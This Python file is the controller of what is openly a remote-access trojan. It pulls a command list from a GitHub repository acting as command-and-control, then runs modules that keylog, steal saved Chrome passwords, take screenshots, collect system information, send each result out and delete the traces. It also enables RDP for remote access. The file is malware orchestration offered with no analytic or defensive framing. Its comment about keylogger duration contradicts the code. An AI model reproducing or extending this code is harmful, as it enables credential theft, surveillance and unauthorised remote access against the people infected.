from screenshot import screenshot
from sysinfo import sysinfo
from keylogger import keylogger
from chromepasswords import chromepasswords
from rdp import RDPEnabler
import base64
import json
import requests
from typing import Dict
from dotenv import load_dotenv
import os

load_dotenv()

#GLOBALS
REPO = os.getenv("repo")
CONFIG_FILE = os.getenv("config-file")

def fetch_config(repo_url: str, config_file: str) -> Dict:
    #Fetches the config file from a GitHub repository and returns its contents as a dictionary.
    api_url = f"https://api.github.com/repos/{repo_url}/contents/{config_file}"
    response = requests.get(api_url)
    response.raise_for_status()
    content = response.json()["content"]
    decoded_content = base64.b64decode(content).decode("utf-8")
    return json.loads(decoded_content)

def run_functions(repo_url: str, config_file: str):
    #Fetches the config file from a GitHub repository and executes the functions listed in the file.
    config = fetch_config(repo_url, config_file)
    for function_name in config:
        if '.' in function_name:
            class_name, method_name = function_name.split('.')
            cls = globals()[class_name]()
            method = getattr(cls, method_name)
            method()
        else:
            globals()[function_name]()

def mod_keylogger():
    # Keylogger duration is set to 60s:
    k = keylogger(duration=10)
    k.start()
    k.sendfile()
    k.remove()

def mod_chromepasswords():
    cp = chromepasswords()
    cp.get_passwords()
    cp.write_passwords()
    cp.send_passwords()
    cp.remove()

def mod_rdp():
    rdp = RDPEnabler()
    rdp.enable_rdp()

def mod_screenshot():
    s = screenshot()
    s.save()
    s.send()
    s.remove()

def mod_systeminfo():
    s = sysinfo()
    s.getInfo()
    s.write()
    s.send()
    s.remove()

def main():
    run_functions(REPO, CONFIG_FILE)

main()